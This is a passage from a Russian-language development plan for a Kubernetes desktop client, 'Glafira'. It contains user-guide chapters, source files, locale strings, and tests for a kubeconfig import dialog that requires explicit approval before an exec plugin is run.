поэтому укажите имя команды и нажмите [[ui:connections.form.exec.find]]: Glafira поищет её в `PATH` оболочки входа
и в стандартных каталогах (`/opt/homebrew/bin`, `/usr/local/bin`, `~/.local/bin`).

Форма показывает точную строку запуска: путь, аргументы и переменные окружения; значения переменных, похожих на
секреты, скрыты. Glafira запускает строку, только когда вы отметите [[ui:connections.form.exec.confirm]]. Любое
изменение строки и подключение, импортированное из файла, требуют нового подтверждения.

Плагины, которые открывают браузер (`kubectl oidc-login`, `kubelogin`), работают: Glafira ждёт до 5 минут, ожидание
можно отменить на вкладке подключения. Плагины, которым нужен терминал (`interactiveMode: Always`, вход по коду
устройства), не поддерживаются. Учётные данные хранятся в памяти до истечения срока; затем плагин запускается снова
([[ui:cluster.session.loginExec]]). Организация может запретить exec-плагины.

## Импорт из kubeconfig {#kubeconfig}

[[ui:sidebar.importKubeconfig]] читает `~/.kube/config` (или первый файл из `KUBECONFIG`) и показывает его контексты.
Выберите, какие импортировать: токены и ключи уйдут в хранилище секретов, сертификаты CA и проект контекста —
в подключение. Связи с файлом Glafira не хранит. Для exec-плагина диалог показывает строку запуска с полным путём
к команде; отметьте разрешение под строкой, чтобы импортировать её подтверждённой. Команды вне списка
разрешённых и контексты с `auth-provider` не поддерживаются — предпросмотр объяснит причину.

## Платформа {#platform}

[[ui:cluster.connection.platform]] определяется при подключении: кластер с группой API `config.openshift.io` — это
OpenShift (OCP или OKD), любой другой — Kubernetes, с дистрибутивом, если Glafira его узнала (EKS, GKE, AKS, Rancher,
Deckhouse, k3s, RKE2). Platform V DropApp пока работает как Kubernetes. Что показывать, решают группы API, а не
платформа: Route, проекты и Gateway API появляются везде, где они есть в кластере.

## Сертификаты и прокси {#tls}

[[ui:connections.form.ca]]: системное хранилище сертификатов или только перечисленные сертификаты (как
`certificate-authority` в kubeconfig). Режим без проверки сертификата небезопасен; организация может его запретить.
[[ui:connections.form.proxy]]: системный прокси (`HTTPS_PROXY` и `NO_PROXY`), без прокси или явный адрес.

## Права {#rights}

Glafira работает только с вашими правами. При подключении она проверяет, что вам доступно на уровне кластера
(проекты, ноды, операторы). Если кластер не даёт вам список проектов, перечислите их в
[[ui:connections.form.manualNamespaces]].

## Окружения и только чтение {#environments}

[[ui:connections.form.environment]] задаёт цвет подключения. Новое подключение `prod` — [[ui:common.readOnly]]:
Glafira ничего не изменит в кластере через него.

## Папки, экспорт и импорт {#folders}

Подключения раскладываются по вложенным папкам: [[ui:sidebar.newFolder]], перетаскивание. [[ui:sidebar.exportAll]]
сохраняет дерево в файл без токенов и ключей; [[ui:sidebar.import]] добавляет подключения из такого файла
с предпросмотром.
````

<!-- block: file t16-docs-guide-ru-getting-started-md step=16.4 path=docs/guide/ru/getting-started.md -->
````markdown
# Начало работы

Glafira for Kubernetes — настольное приложение для работы с кластерами Kubernetes и их диагностики, в фокусе —
OpenShift и Platform V DropApp. Оно подключается с вашими учётными данными и показывает только то, что разрешают ваши
права. В кластере ничего не меняется, пока вы не подтвердите изменение.

## Установка {#install}

Установщики для macOS (`.dmg`), Windows (`.msi`) и Linux (`.deb`, `.rpm`, `.AppImage`) публикуются на
https://github.com/vvnovg/glafira-kubernetes-releases/releases. Организация может настроить приложение политикой:
тогда часть настроек задаёт администратор.

## Первое подключение {#first-connection}

1. Нажмите [[ui:sidebar.newConnection]] в левой панели. Если вы уже работаете с `oc` или `kubectl`, выберите
   [[ui:sidebar.importKubeconfig]]: контексты kubeconfig станут подключениями.
2. Укажите [[ui:connections.form.apiUrl]] — тот адрес, который вы передаёте `oc login`, или `server` кластера
   в kubeconfig, обычно `https://api.<кластер>:6443`.
3. Выберите [[ui:connections.form.authMethod]]: браузер (OpenShift), токен, клиентский сертификат или exec-плагин.
   Подробнее — [Способы входа](connections.md#sign-in).
4. Нажмите [[ui:connections.form.test]]: Glafira по шагам проверит адрес, TLS, вход, платформу и проекты и покажет,
   на каком шаге ошибка. Затем нажмите [[ui:common.save]].
5. Откроется вкладка подключения: кто вы в кластере, платформа, версия Kubernetes и что вам доступно на уровне
   кластера.

## Язык интерфейса {#language}

Откройте [[ui:sidebar.settings]] и выберите [[ui:settings.language.label]]. По умолчанию — как в системе. Если язык
задан вашей организацией, выбор недоступен.

## Справка {#help}

Клавиша F1 на любом экране открывает главу о нём. Руководство работает без интернета; поиск — в поле над содержанием.
````

<!-- block: file t16-src-tauri-src-commands-app-rs step=16.4 path=src-tauri/src/commands/app.rs -->
````rust
use serde::Serialize;
use tauri::{AppHandle, Manager};

use crate::error::AppResult;

/// Версия и каталоги для «О программе».
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct AppInfo {
    pub name: String,
    pub version: String,
    pub commit: String,
    pub os: String,
    pub arch: String,
    pub data_dir: String,
    pub log_dir: String,
}

fn dir(app: &AppHandle, which: &str) -> String {
    let p = match which {
        "data" => app.path().app_data_dir(),
        _ => app.path().app_log_dir(),
    };
    p.map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_else(|_| "—".into())
}

#[tauri::command]
pub fn get_app_info(app: AppHandle) -> AppResult<AppInfo> {
    Ok(AppInfo {
        name: crate::product::PRODUCT_NAME.into(),
        version: env!("CARGO_PKG_VERSION").into(),
        commit: env!("GIT_COMMIT").into(),
        os: std::env::consts::OS.into(),
        arch: std::env::consts::ARCH.into(),
        data_dir: dir(&app, "data"),
        log_dir: dir(&app, "log"),
    })
}
````

<!-- block: file t16-src-components-about-aboutpanel-tsx step=16.4 path=src/components/about/AboutPanel.tsx -->
````tsx
import { useQuery } from "@tanstack/react-query";
import { useTranslation } from "react-i18next";
import { api } from "../../api/client";
import { tr } from "../../i18n/text";
import { openLicense, openSupport } from "../../lib/links";
import { ErrorBanner } from "../common/ErrorBanner";

export function AboutPanel() {
  const { t } = useTranslation();
  const info = useQuery({ queryKey: ["app-info"], queryFn: api.getAppInfo });
  const policy = useQuery({ queryKey: ["policy"], queryFn: api.getPolicyStatus });

  if (info.error) return <ErrorBanner error={info.error} onRetry={() => info.refetch()} />;
  const i = info.data;
  if (!i) return <p className="empty">{t("common.loading")}</p>;
  return (
    <div className="page">
      <div className="toolbar">
        <h2>{i.name}</h2>
      </div>
      <p className="about-summary">{t("about.summary")}</p>
      <dl className="stats">
        <div><dt>{t("about.version")}</dt><dd>{i.version}</dd></div>
        <div><dt>{t("about.build")}</dt><dd>{i.commit}</dd></div>
        <div><dt>{t("about.system")}</dt><dd>{i.os} / {i.arch}</dd></div>
        <div>
          <dt>{t("about.license")}</dt>
          <dd>
            <button type="button" className="link" onClick={openLicense}>
              Apache 2.0
            </button>
          </dd>
        </div>
        <div><dt>{t("about.policy")}</dt><dd>{policy.data ? (policy.data.managed ? t("about.policySet") : t("about.policyNone")) : "…"}</dd></div>
      </dl>
      {policy.data?.errors.map((e, n) => (
        <p key={n} className="warn">
          {t("about.policyError", { error: tr(e) })}
        </p>
      ))}
      <p>
        <button type="button" className="link" onClick={openSupport}>
          {t("support.title")}
        </button>{" "}
        <span className="muted">{t("support.hint")}</span>
      </p>
      <p className="muted">{t("about.dataDir")} <code>{i.dataDir}</code></p>
      <p className="muted">{t("about.logDir")} <code>{i.logDir}</code></p>
      <p className="muted">{t("about.trademarks")}</p>
    </div>
  );
}
````

<!-- block: file t16-src-components-help-helpchapterfor-ts step=16.4 path=src/components/help/helpChapterFor.ts -->
````ts
import type { ChapterId } from "../../guide/chapters";
import type { TabSpec } from "../../state/workspace";

/** Глава руководства для экрана (F1). */
export function helpChapterFor(tab: TabSpec | null): ChapterId {
  switch (tab?.kind) {
    case "connection-form":
    case "cluster":
      return "connections";
    default:
      return "getting-started";
  }
}
````

<!-- block: patch t16-src step=16.4 -->
````diff
diff --git a/PORTED.md b/PORTED.md
--- a/PORTED.md
+++ b/PORTED.md
@@ -90,3 +90,20 @@
 | `src/state/workspace.ts` | `src/state/workspace.ts` | `8bbd0bd` | адаптирован: вкладки O1 |
 | `src/components/connections/profile.ts` | `src/components/connections/profile.ts` | `8bbd0bd` | адаптирован: профиль Kubernetes |
 | `src/components/connections/ConnectionForm.tsx` | `src/components/connections/ConnectionForm.tsx` | `8bbd0bd` | адаптирован: поля Kubernetes, секреты, проверка по шагам |
+| `src/guide/parse.ts` | `src/guide/parse.ts` | `8bbd0bd` | как есть |
+| `src/guide/chapters.test.ts` | `src/guide/chapters.test.ts` | `8bbd0bd` | как есть |
+| `src/components/help/HelpPanel.tsx` | `src/components/help/HelpPanel.tsx` | `8bbd0bd` | как есть |
+| `src/components/help/HelpPanel.test.tsx` | `src/components/help/HelpPanel.test.tsx` | `8bbd0bd` | как есть |
+| `src/state/helpContext.ts` | `src/state/helpContext.ts` | `8bbd0bd` | как есть |
+| `src/guide/parse.test.ts` | `src/guide/parse.test.ts` | `8bbd0bd` | адаптирован: главы O1 |
+| `src/guide/chapters.ts` | `src/guide/chapters.ts` | `8bbd0bd` | адаптирован: главы O1 |
+| `src/components/help/helpChapterFor.ts` | `src/components/help/helpChapterFor.ts` | `8bbd0bd` | адаптирован: вкладки O1 |
+| `src/components/help/helpChapterFor.test.ts` | `src/components/help/helpChapterFor.test.ts` | `8bbd0bd` | адаптирован: вкладки O1 |
+| `src/components/settings/SettingsPanel.tsx` | `src/components/settings/SettingsPanel.tsx` | `8bbd0bd` | адаптирован: без раздела MCP |
+| `src/components/settings/SettingsPanel.test.tsx` | `src/components/settings/SettingsPanel.test.tsx` | `8bbd0bd` | адаптирован: без MCP |
+| `src/components/about/AboutPanel.tsx` | `src/components/about/AboutPanel.tsx` | `8bbd0bd` | адаптирован: без обновлений и диагностики (O6), товарные знаки |
+| `src/components/about/AboutPanel.test.tsx` | `src/components/about/AboutPanel.test.tsx` | `8bbd0bd` | адаптирован: без обновлений и диагностики |
+| `src-tauri/src/commands/app.rs` | `src-tauri/src/commands/app.rs` | `8bbd0bd` | адаптирован: только get_app_info |
+| `scripts/guide-publish.mjs` | `scripts/guide-publish.mjs` | `8bbd0bd` | адаптирован: заголовок |
+| `scripts/guide-publish.test.mjs` | `scripts/guide-publish.test.mjs` | `8bbd0bd` | адаптирован: языки en и ru |
+| `scripts/guide-publish.d.mts` | `scripts/guide-publish.d.mts` | `8bbd0bd` | как есть |
diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -12,7 +12,8 @@
     "tauri": "tauri",
     "test": "vitest run",
     "test:scripts": "node --test \"scripts/*.test.mjs\"",
-    "i18n:check": "node scripts/i18n-check.mjs --rust-cyrillic src-tauri/src"
+    "i18n:check": "node scripts/i18n-check.mjs --rust-cyrillic src-tauri/src",
+    "guide:publish": "node scripts/guide-publish.mjs dist/guide"
   },
   "dependencies": {
     "@floating-ui/react": "^0.27.20",
diff --git a/scripts/i18n-check.mjs b/scripts/i18n-check.mjs
--- a/scripts/i18n-check.mjs
+++ b/scripts/i18n-check.mjs
@@ -560,8 +560,8 @@ export function findRustCyrillic(files) {
   return hits;
 }
 
-/** Главы руководства (этап O1 пишет первые; список растёт вместе с `src/guide/chapters.ts`). */
-export const GUIDE_CHAPTERS = [];
+/** Главы руководства: тот же список, что `GUIDE_CHAPTERS` в `src/guide/chapters.ts`. */
+export const GUIDE_CHAPTERS = ["getting-started", "connections"];
 
 const KEBAB = /^[a-z0-9]+(?:-[a-z0-9]+)*$/;
 
diff --git a/src-tauri/src/commands/mod.rs b/src-tauri/src/commands/mod.rs
--- a/src-tauri/src/commands/mod.rs
+++ b/src-tauri/src/commands/mod.rs
@@ -1,3 +1,4 @@
+pub mod app;
 pub mod auth;
 pub mod connections;
 pub mod folders;
diff --git a/src-tauri/src/lib.rs b/src-tauri/src/lib.rs
--- a/src-tauri/src/lib.rs
+++ b/src-tauri/src/lib.rs
@@ -43,6 +43,7 @@ pub fn run() {
             Ok(())
         })
         .invoke_handler(tauri::generate_handler![
+            commands::app::get_app_info,
             commands::connections::list_connections,
             commands::connections::save_connection,
             commands::connections::delete_connection,
````

<!-- block: shell t16-delete step=16.4 -->
````bash
rm -f docs/guide/en/.gitkeep
rm -f docs/guide/ru/.gitkeep
````

<!-- block: locales t16-locales step=16.4 -->
````json
{
  "en": {
    "sidebar": {
      "settings": "Settings",
      "help": "Help",
      "about": "About",
      "newConnection": "New connection",
      "importKubeconfig": "Import from kubeconfig…",
      "newFolder": "New folder",
      "exportAll": "Export all…",
      "import": "Import…"
    },
    "settings": {
      "title": "Settings",
      "language": {
        "section": "Language",
        "label": "Interface language",
        "system": "System default ({{name}})",
        "systemUnknown": "System default",
        "policy": "The language is set by your organization"
      }
    },
    "help": {
      "search": "Search the guide",
      "noResults": "Nothing found",
      "contents": "Contents",
      "loadFailed": "Could not load the guide"
    },
    "about": {
      "summary": "Glafira is a desktop app for working with Kubernetes clusters and diagnosing them, with OpenShift and Platform V DropApp in focus: connections with a token, a certificate, browser sign-in or an exec plugin, import from kubeconfig, folders and step-by-step connection checks.",
      "version": "Version",
      "build": "Build",
      "system": "System",
      "license": "License",
      "policy": "Organization policy",
      "policySet": "set",
      "policyNone": "none",
      "policyError": "Organization policy: {{error}}",
      "dataDir": "Data:",
      "logDir": "Logs:",
      "trademarks": "Kubernetes is a registered trademark of The Linux Foundation. OpenShift is a trademark of Red Hat, Inc. Platform V and DropApp are trademarks of their respective owners. This project is not affiliated with The Linux Foundation, Red Hat or SberTech."
    },
    "support": {
      "title": "Support the project",
      "hint": "Glafira is free and open source; donations keep it going."
    }
  },
  "ru": {
    "sidebar": {
      "settings": "Настройки",
      "help": "Справка",
      "about": "О программе",
      "newConnection": "Новое подключение",
      "importKubeconfig": "Импорт из kubeconfig…",
      "newFolder": "Новая папка",
      "exportAll": "Экспортировать всё…",
      "import": "Импортировать…"
    },
    "settings": {
      "title": "Настройки",
      "language": {
        "section": "Язык",
        "label": "Язык интерфейса",
        "system": "Как в системе ({{name}})",
        "systemUnknown": "Как в системе",
        "policy": "Язык задан вашей организацией"
      }
    },
    "help": {
      "search": "Поиск по руководству",
      "noResults": "Ничего не найдено",
      "contents": "Содержание",
      "loadFailed": "Не удалось загрузить руководство"
    },
    "about": {
      "summary": "Glafira — настольное приложение для работы с кластерами Kubernetes и их диагностики, в фокусе — OpenShift и Platform V DropApp: подключения по токену, сертификату, через браузер или exec-плагин, импорт из kubeconfig, папки и пошаговая проверка подключения.",
      "version": "Версия",
      "build": "Сборка",
      "system": "Система",
      "license": "Лицензия",
      "policy": "Политика организации",
      "policySet": "задана",
      "policyNone": "нет",
      "policyError": "Политика организации: {{error}}",
      "dataDir": "Данные:",
      "logDir": "Логи:",
      "trademarks": "Kubernetes — зарегистрированный товарный знак The Linux Foundation. OpenShift — товарный знак Red Hat, Inc. Platform V и DropApp — товарные знаки их правообладателей. Проект не связан с The Linux Foundation, Red Hat и СберТех."
    },
    "support": {
      "title": "Поддержать проект",
      "hint": "Glafira бесплатна, её исходный код открыт; пожертвования помогают её развивать."
    }
  }
}
````

Применить: `python3 /tmp/o1a-blocks.py step 16.4`.

- [ ] **Step 5: Проверки.**

Run: `pnpm test`  
Expected: PASS — `Test Files 23 passed`, `Tests 108 passed`

Run: `pnpm exec tsc --noEmit`  
Expected: PASS — без ошибок

Run: `pnpm i18n:check`  
Expected: PASS — `✓ словари en, ru согласованы, вызовов из Rust: 126`

Run: `pnpm test:scripts`  
Expected: PASS — `# pass 54`, `# fail 0`

Run: `cargo test --manifest-path src-tauri/Cargo.toml --lib`  
Expected: PASS — `test result: ok. 182 passed; 0 failed`

- [ ] **Step 6: Commit.**

```bash
git add -A
git commit -s -m "feat(ui): настройки языка, встроенная справка (2 главы en/ru), «О программе»" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

### Task 17: Диалог импорта контекстов kubeconfig

**Files:**
- Create: `src/components/connections/tree/KubeconfigImportDialog.test.tsx`, `src/components/connections/tree/KubeconfigImportDialog.tsx`
- Modify: `src/locales/en.json`, `src/locales/ru.json`

**Interfaces:**
- Consumes: задачи 13–14.
- Produces: `KubeconfigImportDialog({ initialTargetId, onClose, onImported(saved: ConnectionProfile[]) })`.

Спец. §5.2, §5.5. Модальный диалог по образцу импорта подключений: путь файла и «Выбрать файл…», контексты с адресом, пользователем, проектом и способом входа, пометки «текущий контекст», «без проверки сертификата», «обновит существующее подключение», причины неподдерживаемых (флажок неактивен), папка для новых подключений. У exec-плагина — строка запуска с полным путём и отдельная галочка «Разрешить Glafira запускать эту команду»: пока у выбранного exec-контекста её нет, импорт неактивен; разрешённые контексты уходят в `approveExec`. Пока выбор не меняли, отмечен текущий контекст файла.

- [ ] **Step 1: Тесты.**

<!-- block: file t17-src-components-connections-tree-kubeconfigimportdialog-test-tsx step=17.1 path=src/components/connections/tree/KubeconfigImportDialog.test.tsx -->
````tsx
import { screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { renderWithClient } from "../../../test/render";

vi.mock("@tauri-apps/plugin-dialog", () => ({ open: vi.fn() }));
vi.mock("../../../api/client", async (importOriginal) => {
  const orig = await importOriginal<typeof import("../../../api/client")>();
  return {
    ...orig,
    api: { listFolders: vi.fn(), previewKubeconfigImport: vi.fn(), applyKubeconfigImport: vi.fn() },
  };
});

import { open as openDialog } from "@tauri-apps/plugin-dialog";
import { api } from "../../../api/client";
import type { KubeconfigPreview, KubeContext } from "../../../api/types";
import { KubeconfigImportDialog } from "./KubeconfigImportDialog";

const ctx = (name: string, extra: Partial<KubeContext> = {}): KubeContext => ({
  name,
  cluster: "c",
  server: "https://api.dev:6443",
  user: "alice",
  namespace: null,
  auth: "token",
  insecure: false,
  current: false,
  exec: null,
  unsupported: null,
  existingId: null,
  ...extra,
});

const PREVIEW: KubeconfigPreview = {
  path: "/home/u/.kube/config",
  contexts: [
    ctx("dev", { current: true, namespace: "team-a" }),
    ctx("lab", { insecure: true, existingId: "old" }),
    ctx("evil", {
      auth: "exec",
      unsupported: { key: "errors.exec.notAllowed", params: { command: "sh" }, text: "not allowed" },
    }),
  ],
};

beforeEach(() => {
  vi.clearAllMocks();
  vi.mocked(api.listFolders).mockResolvedValue([{ id: "f", name: "Kubeconfig", parentId: null, order: 0 }]);
  vi.mocked(api.previewKubeconfigImport).mockResolvedValue(PREVIEW);
});

describe("KubeconfigImportDialog", () => {
  it("показывает контексты, отмечает текущий и объясняет неподдерживаемые", async () => {
    renderWithClient(<KubeconfigImportDialog initialTargetId={null} onClose={() => {}} onImported={() => {}} />);
    expect(await screen.findByText("/home/u/.kube/config")).toBeInTheDocument();
    expect(api.previewKubeconfigImport).toHaveBeenCalledWith(null);
    expect(screen.getByRole("checkbox", { name: "dev" })).toBeChecked();
    expect(screen.getByRole("checkbox", { name: "lab" })).not.toBeChecked();
    expect(screen.getByRole("checkbox", { name: "evil" })).toBeDisabled();
    expect(screen.getByText("«sh» нет в списке разрешённых exec-плагинов")).toBeInTheDocument();
    expect(screen.getByText(/без проверки сертификата/)).toBeInTheDocument();
    expect(screen.getByText(/обновит существующее подключение/)).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Импортировать 1 контекст" })).toBeEnabled();
  });

  it("импортирует выбранные контексты в папку", async () => {
    vi.mocked(api.applyKubeconfigImport).mockResolvedValue([]);
    const onImported = vi.fn();
    const user = userEvent.setup();
    renderWithClient(<KubeconfigImportDialog initialTargetId={null} onClose={() => {}} onImported={onImported} />);
    await user.click(await screen.findByRole("checkbox", { name: "lab" }));
    await user.selectOptions(screen.getByLabelText("Папка для новых подключений"), "f");
    await user.click(screen.getByRole("button", { name: "Импортировать 2 контекста" }));
    await waitFor(() => expect(onImported).toHaveBeenCalledWith([]));
    expect(api.applyKubeconfigImport).toHaveBeenCalledWith("/home/u/.kube/config", ["dev", "lab"], "f", []);
  });

  it("exec-плагин: строка запуска и отдельное разрешение перед импортом", async () => {
    vi.mocked(api.previewKubeconfigImport).mockResolvedValue({
      path: "/home/u/.kube/config",
      contexts: [
        ctx("eks", {
          auth: "exec",
          current: true,
          exec: {
            command: "/usr/local/bin/aws",
            args: ["--region", "eu-west-1", "eks", "get-token", "--cluster-name", "prod"],
            env: [{ name: "AWS_PROFILE", value: "prod" }],
            apiVersion: "client.authentication.k8s.io/v1beta1",
            provideClusterInfo: false,
            approved: null,
          },
        }),
      ],
    });
    vi.mocked(api.applyKubeconfigImport).mockResolvedValue([]);
    const user = userEvent.setup();
    renderWithClient(<KubeconfigImportDialog initialTargetId={null} onClose={() => {}} onImported={() => {}} />);
    expect(await screen.findByText(/alice · exec-плагин/)).toBeInTheDocument();
    expect(screen.getByLabelText("Строка запуска")).toHaveTextContent(
      "AWS_PROFILE=prod /usr/local/bin/aws --region eu-west-1 eks get-token --cluster-name prod",
    );
    const importButton = screen.getByRole("button", { name: "Импортировать 1 контекст" });
    expect(importButton).toBeDisabled();
    expect(screen.getByText("Разрешите запуск выбранных exec-плагинов, чтобы импортировать их")).toBeInTheDocument();
    await user.click(screen.getByRole("checkbox", { name: "Разрешить Glafira запускать эту команду" }));
    await user.click(importButton);
    expect(api.applyKubeconfigImport).toHaveBeenCalledWith("/home/u/.kube/config", ["eks"], null, ["eks"]);
  });

  it("выбор другого файла перечитывает контексты", async () => {
    vi.mocked(openDialog).mockResolvedValue("/tmp/other.yaml");
    const user = userEvent.setup();
    renderWithClient(<KubeconfigImportDialog initialTargetId={null} onClose={() => {}} onImported={() => {}} />);
    await user.click(await screen.findByRole("button", { name: "Выбрать файл…" }));
    await waitFor(() => expect(api.previewKubeconfigImport).toHaveBeenCalledWith("/tmp/other.yaml"));
  });

  it("ошибка чтения файла и Esc закрывает", async () => {
    vi.mocked(api.previewKubeconfigImport).mockRejectedValue({
      code: "INVALID_INPUT",
      key: "errors.kubeconfig.noDefault",
      message: "x",
      retryable: false,
    });
    const onClose = vi.fn();
    const user = userEvent.setup();
    renderWithClient(<KubeconfigImportDialog initialTargetId={null} onClose={onClose} onImported={() => {}} />);
    expect(await screen.findByText("Kubeconfig по умолчанию не найден — выберите файл")).toBeInTheDocument();
    await user.keyboard("{Escape}");
    expect(onClose).toHaveBeenCalled();
  });
});
````

Применить: `python3 /tmp/o1a-blocks.py step 17.1`.

- [ ] **Step 2: Увидеть падение.**

Run: `pnpm vitest run src/components/connections/tree/KubeconfigImportDialog.test.tsx`
Expected: FAIL — нет модулей или компонентов, которые проверяют тесты.

- [ ] **Step 3: Реализация.**

<!-- block: file t17-src-components-connections-tree-kubeconfigimportdialog-tsx step=17.3 path=src/components/connections/tree/KubeconfigImportDialog.tsx -->
````tsx
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { open as openDialog } from "@tauri-apps/plugin-dialog";
import { type KeyboardEvent, useEffect, useId, useRef, useState } from "react";
import { useTranslation } from "react-i18next";
import { api } from "../../../api/client";
import type { ConnectionProfile, KubeContext } from "../../../api/types";
import { tr } from "../../../i18n/text";
import { trapTab } from "../../../lib/focusTrap";
import { ErrorBanner } from "../../common/ErrorBanner";
import { Hint } from "../../common/Hint";
import { launchLine } from "../exec";
import { folderPaths } from "./folderTree";

interface Props {
  /** Папка новых подключений по умолчанию; null — корень. */
  initialTargetId: string | null;
  onClose: () => void;
  onImported: (saved: ConnectionProfile[]) => void;
}

/**
 * Импорт контекстов kubeconfig: файл по умолчанию (`KUBECONFIG` или `~/.kube/config`) или выбранный,
 * список контекстов с причинами, почему контекст нельзя импортировать, папка и применение.
 * Строку запуска exec-плагина человек разрешает отдельной галочкой (спец. §5.2).
 */
export function KubeconfigImportDialog({ initialTargetId, onClose, onImported }: Props) {
  const { t } = useTranslation();
  const queryClient = useQueryClient();
  const titleId = useId();
  const rootRef = useRef<HTMLDivElement>(null);
  const [path, setPath] = useState<string | null>(null);
  const [targetId, setTargetId] = useState<string | null>(initialTargetId);
  const [selected, setSelected] = useState<Set<string> | null>(null);
  const [allowed, setAllowed] = useState<Set<string>>(new Set());
  const [busy, setBusy] = useState(false);
  const [applyError, setApplyError] = useState<unknown>(null);

  const foldersQ = useQuery({ queryKey: ["folders"], queryFn: api.listFolders });
  const previewQ = useQuery({
    queryKey: ["kubeconfig-preview", path],
    queryFn: () => api.previewKubeconfigImport(path),
    gcTime: 0,
    staleTime: 0,
  });
  const preview = previewQ.data;
  const paths = folderPaths(foldersQ.data ?? []);
  // Пока пользователь не менял выбор, отмечен текущий контекст файла (если его можно импортировать).
  const chosen = selected ?? new Set(preview?.contexts.filter((c) => c.current && !c.unsupported).map((c) => c.name) ?? []);
  // Выбранные exec-плагины, строку запуска которых ещё не разрешили.
  const unconfirmed = (preview?.contexts ?? []).filter((c) => c.exec && chosen.has(c.name) && !allowed.has(c.name));

  useEffect(() => {
    const returnTo = document.activeElement instanceof HTMLElement ? document.activeElement : null;
    rootRef.current?.querySelector<HTMLElement>("button")?.focus();
    return () => {
      if (returnTo?.isConnected) returnTo.focus();
    };
  }, []);

  const toggle = (c: KubeContext) => {
    const next = new Set(chosen);
    if (next.has(c.name)) next.delete(c.name);
    else next.add(c.name);
    setSelected(next);
  };

  const toggleAllowed = (c: KubeContext) => {
    const next = new Set(allowed);
    if (next.has(c.name)) next.delete(c.name);
    else next.add(c.name);
    setAllowed(next);
  };

  const pickFile = async () => {
    const file = await openDialog({ multiple: false, directory: false });
    if (typeof file === "string") {
      setSelected(null);
      setAllowed(new Set());
      setPath(file);
    }
  };

  const apply = async () => {
    if (!preview) return;
    setBusy(true);
    setApplyError(null);
    try {
      const names = preview.contexts.filter((c) => chosen.has(c.name)).map((c) => c.name);
      const approveExec = names.filter((n) => allowed.has(n));
      const saved = await api.applyKubeconfigImport(preview.path, names, targetId, approveExec);
      await queryClient.invalidateQueries({ queryKey: ["connections"] });
      onImported(saved);
    } catch (err) {
      setApplyError(err);
      setBusy(false);
    }
  };

  const onKeyDown = (e: KeyboardEvent) => {
    if (e.key === "Tab") trapTab(rootRef.current, e);
    if (e.key === "Escape" && !busy) {
      e.stopPropagation();
      onClose();
    }
  };

  return (
    <div className="modal-backdrop">
      <div className="modal" role="dialog" aria-modal="true" aria-labelledby={titleId} ref={rootRef} onKeyDown={onKeyDown}>
        <h3 id={titleId}>{t("kubeconfig.title")}</h3>
        <div className="toolbar">
          <span className="muted">{preview ? preview.path : t("common.loading")}</span>
          <button type="button" disabled={busy} onClick={() => void pickFile()}>
            {t("kubeconfig.chooseFile")}
          </button>
        </div>
        {previewQ.error != null && <ErrorBanner error={previewQ.error} />}
        {preview && preview.contexts.length === 0 && <p className="empty">{t("kubeconfig.noContexts")}</p>}
        {preview && preview.contexts.length > 0 && (
          <ul className="steps">
            {preview.contexts.map((c) => (
              <li key={c.name}>
                <label className="inline">
                  <input type="checkbox" checked={chosen.has(c.name)} disabled={!!c.unsupported || busy} onChange={() => toggle(c)} />
                  <strong>{c.name}</strong>
                </label>{" "}
                <span className="muted">
                  {c.server} · {c.user || "—"}
                  {c.namespace ? ` · ${c.namespace}` : ""} · {t(`kubeconfig.auth.${c.auth}`)}
                </span>
                {c.current && <span className="muted"> · {t("kubeconfig.current")}</span>}
                {c.insecure && <span className="warn"> · {t("kubeconfig.insecure")}</span>}
                {c.existingId && <span className="muted"> · {t("kubeconfig.updatesExisting")}</span>}
                {c.unsupported && <p className="muted">{tr(c.unsupported)}</p>}
                {c.exec && (
                  <>
                    <pre aria-label={t("connections.form.exec.line")}>{launchLine(c.exec)}</pre>
                    <label className="inline">
                      <input
                        type="checkbox"
                        checked={allowed.has(c.name)}
                        disabled={!chosen.has(c.name) || busy}
                        onChange={() => toggleAllowed(c)}
                      />
                      {t("kubeconfig.allowExec")}
                    </label>
                  </>
                )}
              </li>
            ))}
          </ul>
        )}
        <div className="form">
          <span className="field-label">
            <label htmlFor={`${titleId}-target`}>{t("kubeconfig.target")}</label>
            <Hint k="hints.kubeconfig.target" label={t("kubeconfig.target")} />
          </span>
          <select id={`${titleId}-target`} value={targetId ?? ""} disabled={busy} onChange={(e) => setTargetId(e.target.value || null)}>
            <option value="">{t("connections.form.folderRoot")}</option>
            {paths.map((p) => (
              <option key={p.id} value={p.id}>
                {p.path.join(" / ")}
              </option>
            ))}
          </select>
        </div>
        {applyError != null && <ErrorBanner error={applyError} />}
        {unconfirmed.length > 0 && <p className="muted">{t("kubeconfig.confirmExec")}</p>}
        <div className="toolbar">
          <button
            type="button"
            className="primary"
            disabled={!preview || chosen.size === 0 || unconfirmed.length > 0 || busy}
            onClick={() => void apply()}
          >
            {t("kubeconfig.apply", { count: chosen.size })}
          </button>
          <button type="button" disabled={busy} onClick={onClose}>
            {t("common.cancel")}
          </button>
        </div>
      </div>
    </div>
  );
}
````

<!-- block: locales t17-locales step=17.3 -->
````json
{
  "en": {
    "kubeconfig": {
      "title": "Import from kubeconfig",
      "chooseFile": "Choose file…",
      "noContexts": "There are no contexts in this file.",
      "current": "current context",
      "insecure": "without certificate verification",
      "updatesExisting": "updates an existing connection",
      "allowExec": "Allow Glafira to run this command",
      "confirmExec": "Allow the launch lines of the selected exec plugins to import them",
      "target": "Folder for new connections",
      "auth": {
        "token": "token",
        "clientCert": "client certificate",
        "browser": "sign-in via browser",
        "exec": "exec plugin"
      },
      "apply_one": "Import {{count}} context",
      "apply_other": "Import {{count}} contexts",
      "imported_one": "Imported {{count}} connection",
      "imported_other": "Imported {{count}} connections"
    },
    "hints": {
      "kubeconfig": {
        "target": "New connections go to this folder; connections that already exist keep their place, name, environment and color."
      }
    }
  },
  "ru": {
    "kubeconfig": {
      "title": "Импорт из kubeconfig",
      "chooseFile": "Выбрать файл…",
      "noContexts": "В файле нет контекстов.",
      "current": "текущий контекст",
      "insecure": "без проверки сертификата",
      "updatesExisting": "обновит существующее подключение",
      "allowExec": "Разрешить Glafira запускать эту команду",
      "confirmExec": "Разрешите запуск выбранных exec-плагинов, чтобы импортировать их",
